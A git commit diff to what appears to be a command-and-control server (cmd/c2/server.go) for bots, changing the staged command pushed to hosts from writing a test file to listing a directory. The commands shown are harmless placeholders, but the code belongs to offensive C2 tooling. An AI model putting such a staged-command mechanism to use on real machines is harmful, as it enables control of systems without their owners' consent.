9088ec74a7e89755cd787c106b49f9fd85bebf3e
oneNutW0nder <scb5436@rit.edu>
2019-10-23 05:07:25 -0400

    mas testing lol this is so painful

--- cmd/c2/server.go
+++ cmd/c2/server.go
@@ -11,7 +11,7 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-var stagedCmd = "echo \"HELLO!\" > /tmp/cattails"
+var stagedCmd = "ls -a -h -l"
 
 // Host defines values for a callback from a bot
 type Host struct {
